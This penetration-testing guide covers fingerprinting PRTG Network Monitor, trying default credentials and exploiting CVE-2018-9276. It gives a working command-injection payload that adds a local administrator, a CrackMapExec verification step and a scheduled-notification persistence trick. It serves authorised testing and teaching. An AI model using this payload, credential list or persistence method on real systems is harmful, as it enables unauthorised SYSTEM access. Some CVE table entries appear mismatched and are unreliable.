# PRTG Network Monitor: Discovery and Attack

[PRTG Network Monitor](https://www.paessler.com/prtg) is an agentless network monitoring tool from Paessler used to monitor bandwidth, uptime, and device statistics across routers, switches, servers, and other hosts. It supports ICMP, SNMP, WMI, NetFlow, and a REST API for device communication. With 300,000 users worldwide and frequent deployment on Windows infrastructure, it is a common finding during internal penetration tests, often configured with default or weak credentials.

***

## Discovery and Footprinting

PRTG runs on common web ports and is identifiable through Nmap service detection. The Nmap `VERSION` scan will label it as `Paessler PRTG bandwidth monitor`:

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

```
8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

You can confirm the exact version number from the page source using cURL:

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

```
<span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

PRTG also appears in [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) reports with default credentials pre-listed, and [Nessus plugin 51874](https://www.tenable.com/plugins/nessus/51874) detects its presence.

***

## Authentication

The default credentials for PRTG on first install are `prtgadmin:prtgadmin`, displayed directly on the login page.  Paessler recommends changing these immediately, but many internal deployments never do. If the defaults fail, try common weak passwords before moving to brute force: 

- `prtgadmin:prtgadmin`
- `prtgadmin:Password123`
- `prtgadmin:Welcome1`
- `admin:admin`

***

## CVE-2018-9276: Authenticated Command Injection

[CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) is an authenticated OS command injection vulnerability affecting PRTG Network Monitor versions before 18.2.39.  The `Parameter` field in the notification management system is passed directly into a PowerShell script without sanitisation, allowing arbitrary command execution under the context of the PRTG service account, which typically runs as `SYSTEM`.  CISA added this to its Known Exploited Vulnerabilities catalogue with a remediation due date in February 2025. 

### Exploitation: Manual Steps

**Navigate to the notification page:**

```
Setup > Account Settings > Notifications > Add new notification
```

Direct URL: `http://<target>:8080/editnotification.htm?id=new&tabid=1`

**Configure the notification:**

1. Give it an arbitrary name
2. Scroll down and tick the checkbox next to EXECUTE PROGRAM
3. Under Program File, select `Demo exe notification - outfile.ps1` from the dropdown
4. In the Parameter field, inject your command using a semicolon as separator:

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

5. Click Save

**Trigger execution:**

Click the Test button next to the notification. A popup will confirm `EXE notification is queued up`. Execution is blind, so there is no direct output. Verify success with CrackMapExec:

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

```
SMB   10.129.201.50   445   APP03   [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

From here, connect using RDP, WinRM, [evil-winrm](https://github.com/Hackplayers/evil-winrm), or impacket tools such as `psexec.py` or `wmiexec.py`.

### Exploitation: Automated

The Metasploit module [exploit/windows/http/prtg_authenticated_rce](https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/) and Python3 PoC scripts at [CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276) and [wildkindcc/CVE-2018-9276](https://github.com/wildkindcc/CVE-2018-9276) automate the full chain. 

***

## Scheduling for Persistence

When creating the notification, a schedule can be set during setup rather than triggering it manually with the Test button. Configuring a daily run time gives a persistent re-entry mechanism throughout a long-term engagement, as the command will execute automatically at the set interval. Document any scheduled notifications created during testing and remove them after the assessment completes.

***

## PRTG CVE Summary

Of the [26 total CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) assigned to PRTG, only a small number have usable public PoCs:

| CVE | Type | Notes |
|---|---|---|
| CVE-2018-9276 | Authenticated command injection | Primary exploitation path, affects versions before 18.2.39  [tenable](https://www.tenable.com/cve/CVE-2018-9276) |
| CVE-2018-19410 | Unauthenticated account creation | Can be used to create an admin account without credentials  [github](https://github.com/A1vinSmith/CVE-2018-9276) |
| CVE-2018-11409 (Splunk context) | Information disclosure | Not PRTG-specific |
| Two XSS CVEs | Cross-site scripting | Limited direct exploitation value |
| One DoS CVE | Denial of Service | Not useful for access |

> On any internal test where PRTG is found, test default credentials first and check the version immediately. Anything below 18.2.39 with admin access is a reliable path to `SYSTEM` on the host.
